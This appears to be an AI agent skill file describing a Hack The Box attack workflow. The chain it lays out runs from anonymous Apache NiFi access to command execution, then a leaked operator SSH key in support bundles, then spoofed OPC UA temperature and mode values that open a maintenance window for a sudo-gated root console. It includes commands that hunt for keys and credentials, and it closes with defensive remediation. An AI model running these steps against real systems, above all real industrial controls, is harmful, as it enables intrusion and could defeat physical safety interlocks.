---
name: htb-it-ot-nifi-opcua-privesc
description: Reusable HTB/pentest workflow for IT/OT chains involving exposed Apache NiFi, OPC UA process-state manipulation, support-bundle secret discovery, and gated maintenance-console privilege escalation.
version: 1.0.0
author: chillspwn
license: MIT
platforms: [linux]
metadata:
  hermes:
    tags: [htb, kali, nifi, opcua, ot, privesc, support-bundles, sudo]
    related_skills: [kali-pentest-explainer-lane, kali-arsenal, network-attack-surface-mapping, pentest-report-pdf]
---

# HTB IT/OT NiFi → OPC UA → Maintenance Console PrivEsc

## Trigger

Use this skill when a target exposes:

- Apache NiFi, especially anonymous or weakly authenticated NiFi
- OT/ICS-themed services such as OPC UA, HMI, PLC, safety controller, reactor/plant dashboards
- Maintenance windows, sudo-gated maintenance binaries, or process-state authorization logic
- Application support bundles, backups, or leaked operator keys

## Core Lesson

Do not look for a single exploit. Map trust relationships and chain the weakest transitions:

```text
anonymous -> NiFi restricted processors
nifi -> readable support bundle / local config
support bundle -> operator SSH key or credential
operator -> maintenance sudo rule
OPC writable state -> maintenance window OPEN
maintenance window -> root shell
```

## Methodology

### 1. Recon and service mapping

Start with Kali-native enumeration:

```bash
nmap -p- --min-rate 5000 --open <target> -oA scans/nmap_allports
nmap -sC -sV -p<ports> <target> -oA scans/nmap_services
ffuf -u http://<target>/ -H 'Host: FUZZ.<domain>' -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

Map business services, not just ports. For IT/OT boxes, identify:

- Public web site
- NiFi or workflow system
- HMI/dashboard
- OPC UA endpoint
- PLC/safety controller
- SSH or operator access

### 2. Check NiFi authorization immediately

Probe current user and permissions:

```bash
curl -s -H 'Host: flow.<domain>' http://<target>/nifi-api/flow/current-user | jq .
curl -s -H 'Host: flow.<domain>' http://<target>/nifi-api/resources | jq .
```

High-risk signal:

```json
"identity": "anonymous",
"restrictedComponentsPermissions": {"canRead": true, "canWrite": true}
```

This usually means the API can create processors capable of file read or code execution.

### 3. Prefer in-band RCE when callbacks fail

If reverse shells/callbacks are blocked, build an in-band execution path inside NiFi:

```text
GenerateFlowFile -> ExecuteStreamCommand -> queue -> download FlowFile content
```

This is more reliable in HTB/egress-filtered environments than `/dev/tcp`, `curl` callbacks, or classic reverse shells.

Verify foothold with:

```bash
id; hostname; pwd; env
```

### 4. Hunt for local secrets and support artifacts

After foothold as a service account such as `nifi`, do not tunnel-vision on flags. Search application directories for pivots:

```bash
find / -xdev \( \
  -iname '*id_rsa*' -o -iname '*id_ed25519*' -o -iname 'authorized_keys' -o \
  -iname '*.bak' -o -iname '*backup*' -o -iname '*support*' -o -iname '*bundle*' -o \
  -iname '*operator*' -o -iname '*credential*' -o -iname '*secret*' \
\) -ls 2>/dev/null
```

Critical lesson from Helix: the winning pivot was a readable key at:

```text
/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
```

not a standard `/home/operator/.ssh/id_rsa` path.

### 5. Treat decrypted credentials as scoped until proven otherwise

NiFi sensitive property decryption may reveal passwords, but they may only apply to app-local databases:

```text
jdbc:h2:mem:maint;MODE=MySQL;DB_CLOSE_DELAY=-1
```

Always determine credential scope before spending time on reuse. Test quickly, then move on:

```bash
sshpass -p '<pass>' ssh operator@<target> 'id'
su operator
sudo -S -l
```

If reuse fails, use the credential as a clue, not a blocker.

### 6. Enumerate OPC UA namespace and writability

For OPC UA targets, browse namespace 2 and identify variables/methods:

```python
from asyncua import Client
# Browse ns=2 recursively; record browse name, display name, value, user access level.
```

Look for process variables such as:

- TemperatureRaw
- Temperature
- Pressure
- CalibrationOffset
- Mode
- TestOverride
- ResetTrip
- Safety/TripActive

If methods are absent and variables are writable, the exploit is likely state manipulation rather than direct command execution.

### 7. Business-logic privesc: maintenance windows are state machines

Privilege escalation may be gated by process state. Reverse the state machine instead of brute-forcing binaries.

Example Helix trigger:

```text
Temperature >= 295 C
Mode = MAINTENANCE
TestOverride = True
```

Static values may fail because telemetry drifts. Use a dynamic offset:

```python
raw = read_opc('TemperatureRaw')
offset = 295.8 - raw
write_opc('CalibrationOffset', offset)
write_opc('Mode', 'MAINTENANCE')
write_opc('TestOverride', True)
```

Then verify with HMI:

```bash
curl -s http://<target>:<hmi-port>/ | grep -E 'OPEN|CLOSED|Temperature|Mode|Override'
```

### 8. After user pivot, run `sudo -l`

Once you obtain an operator account, immediately run:

```bash
id
groups
sudo -n -l
ls -la ~
```

Look for NOPASSWD entries such as:

```text
(root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

If the sudo binary is gated, reopen the OT maintenance window and run it during the valid interval.

### 9. Execute gated root console with piped commands

If the maintenance console launches a root shell only during an OPEN window:

```bash
printf 'id; hostname; cat /root/root.txt; exit\n' | sudo -n /usr/local/sbin/helix-maint-console
```

Use `ssh -tt` if PTY behavior matters:

```bash
ssh -tt -i operator_key operator@<target> \
  'printf "id; cat /root/root.txt; exit\n" | sudo -n /usr/local/sbin/helix-maint-console'
```

## Pitfalls

- Do not assume RCE failed just because reverse shells fail. Build in-band output retrieval.
- Do not assume decrypted NiFi passwords are Linux credentials. Determine scope.
- Do not hardcode OT thresholds. Read live telemetry and calculate values dynamically.
- Do not stop at permission denied. It defines the next trust boundary to bypass.
- Do not brute-force maintenance window marker filenames forever. Reverse HMI/safety logic and inspect telemetry.
- Do not ignore odd application paths like `support-bundles/`, `backup/`, `.bak`, `.old`, and deployment artifacts.
- Do not let HMI route fuzzing consume time if the HMI is a simple status dashboard; switch back to local secret discovery and privilege relationships.

## Evidence to Preserve

Save all raw evidence under the target workspace:

```text
/root/htb/boxes/<target>/scans/
/root/htb/boxes/<target>/loot/
/root/htb/boxes/<target>/work/
/root/htb/boxes/<target>/report/
```

Minimum report evidence:

- nmap service output
- NiFi current-user permissions
- RCE proof as service account
- sensitive property/context evidence with secrets redacted
- support bundle/key path and SSH proof
- OPC UA namespace/writable variables
- HMI OPEN-window proof
- `sudo -l` output for operator
- root proof and flags

## Defensive Remediation Themes

- Disable NiFi anonymous access and restrict `/nifi-api`.
- Deny restricted component permissions to unauthenticated or low-trust users.
- Remove private keys and credentials from support bundles; rotate exposed keys.
- Use external secret storage for NiFi credentials and protect local config files.
- Require OPC UA authentication and per-node authorization.
- Do not use writable process telemetry as a direct authorization gate for root maintenance actions.
- Audit sudoers rules that invoke maintenance binaries and ensure they validate authorization robustly.
